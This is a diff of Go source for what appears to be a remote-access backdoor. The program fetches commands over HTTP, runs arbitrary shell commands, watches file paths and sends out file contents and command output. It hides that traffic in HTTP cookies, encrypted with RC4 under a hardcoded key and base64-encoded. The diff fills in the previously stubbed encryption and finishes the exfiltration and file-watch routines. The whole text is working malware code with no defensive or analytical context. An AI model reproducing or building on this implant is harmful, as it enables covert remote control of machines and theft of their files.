@@ -1,6 +1,8 @@
 package main
 
 import (
+	"encoding/base64"
+	"crypto/rc4"
 	"fmt"
 	"golang.org/x/exp/inotify"
 	"io"
@@ -25,13 +27,15 @@ func serverWorker(clientIp string) {
 
 	fmt.Printf("Got connection from %v\n", clientIp)
 
+	defer fmt.Printf("Worker for %v done\n", clientIp)
+
 	results := make(chan string)
 
 	client := &http.Client{}
 
 	//resp, err := client.Get(clientIp.String())
 
-	ticker := time.NewTicker(time.Second * 5)
+	ticker := time.NewTicker(time.Second * 1)
 	defer ticker.Stop()
 
 	for _ = range ticker.C {
@@ -59,16 +63,14 @@ func serverWorker(clientIp string) {
 			myCookie.HttpOnly = false
 
 			//encode data into a response cookie
-
 			request.AddCookie(&myCookie)
-			fmt.Printf("Adding cookie: \"%v\"\n", resultData)
 		default:
 		}
 
 		//send http request to "server"
 		response, err := client.Do(request)
 		if err != nil {
-			fmt.Println(err.Error())
+			// client disconnect
 			return
 		}
 
@@ -102,12 +104,6 @@ func runCommand(data string, results chan<- string) {
 		runGet(command[1:], results)
 	}
 
-	//chdir
-
-	//watch
-
-	//getFile
-
 }
 
 func sendChunks(command, seq byte, data []byte, results chan<- string) {
@@ -133,7 +129,8 @@ func runExec(command []byte, results chan<- string) {
 	seq := command[0]
 
 	// cast data section into chuncks of strings
-	commandParts := strings.Split(string(command[1:]), " ")
+	fmt.Printf("EXEC: %v\n", string(command[1:]))
+	commandParts := strings.Split(strings.TrimSpace(string(command[1:])), " ")
 
 	// create exec
 	cmd := exec.Command(commandParts[0], commandParts[1:]...)
@@ -141,12 +138,15 @@ func runExec(command []byte, results chan<- string) {
 	// run exec and get output
 	output, err := cmd.CombinedOutput()
 	if err != nil {
+		fmt.Printf("EXEC %v error\n", seq)
+		fmt.Println(err.Error())
 		return
 	}
 
 	// prepare a buffer for encoding the output
 	result := make([]byte, 0, len(output)+2)
 	result = append(result, 1, seq)
+	result = append(result, output...)
 	sendChunks(EXEC, seq, result, results)
 }
 
@@ -157,6 +157,8 @@ func runWatch(command []byte, results chan<- string) {
 
 	// cast the data into a file string
 	path := string(command[1:])
+	fmt.Printf("Starting watch on %v\n", path)
+	defer fmt.Printf("Watch on %v done\n", path)
 
 	// create watcher
 	watcher, err := inotify.NewWatcher()
@@ -176,13 +178,17 @@ func runWatch(command []byte, results chan<- string) {
 	resultHeader = append(resultHeader, WATCH, seq)
 
 	// wait on watch or error events from the watcher
-	select {
-	case ev := <-watcher.Event:
-		result := append(resultHeader, []byte(ev.String())...)
-		sendChunks(WATCH, seq, result, results)
+	for {
+		select {
+		case ev := <-watcher.Event:
+			fmt.Printf("Watcher %v event\n", seq)
+			result := append(resultHeader, []byte(ev.String())...)
+			sendChunks(WATCH, seq, result, results)
 
-	case err = <-watcher.Error:
-		return
+		case err = <-watcher.Error:
+			fmt.Printf("Watcher %v finished\n", seq)
+			return
+		}
 	}
 }
 
@@ -193,36 +199,58 @@ func runGet(command []byte, results chan<- string) {
 
 	// cast the data to a path
 	path := string(command[1:])
+	fmt.Printf("Getting file %v\n", path)
+	defer fmt.Println("File transfer compelte")
 
 	// attempt to open file
 	file, err := os.Open(path)
 	if err != nil {
+		fmt.Print(err)
 		return
 	}
 	defer file.Close()
 
-	buf := make([]byte, 0, chunkSize+2)
-	buf = append(buf, GET, seq)
+	buf := make([]byte, chunkSize+2)
+	buf[0] = GET
+	buf[1] = seq
 
 	for {
 		n, err := file.Read(buf[2:])
 		if n == 0 {
+			fmt.Println("No bytes read")
 			break
 		}
+		fmt.Printf("Sending %v bytes\n", n)
 		results <- encrypt(buf[:n+2])
+		fmt.Println(buf[:n+2])
 		if err == io.EOF {
 			break
 		}
 	}
 
+	results <- encrypt(buf[:2])
+
 }
 
 func encrypt(data []byte) string {
-	//TODO
-	return string(data)
+	cipher, err := rc4.NewCipher([]byte("myKey"))
+	if err != nil {
+		panic(err)
+	}
+
+	cipher.XORKeyStream(data, data)
+
+	return base64.RawStdEncoding.EncodeToString(data)
 }
 
 func decrypt(data string) []byte {
-	//TODO
-	return []byte(data)
+	command, _ := base64.RawStdEncoding.DecodeString(data)
+
+	cipher, err := rc4.NewCipher([]byte("myKey"))
+	if err != nil {
+		panic(err)
+	}
+
+	cipher.XORKeyStream(command, command)
+	return command
 }
